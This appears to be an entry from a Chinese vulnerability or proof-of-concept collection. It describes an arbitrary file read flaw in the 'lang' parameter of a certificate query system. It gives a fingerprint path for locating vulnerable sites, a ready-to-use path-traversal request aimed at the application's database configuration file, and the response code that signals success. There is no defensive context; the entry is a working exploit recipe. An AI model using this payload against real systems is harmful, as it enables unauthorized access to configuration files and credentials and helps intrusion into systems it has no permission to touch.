# 证书系统查询系统lang存在任意文件读取漏洞

证书系统查询系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`"/index/js/jquery.uls.data.js"`

**Payload**
```
/index/ajax/lang?lang=../../application/database
```
- **响应特征**：200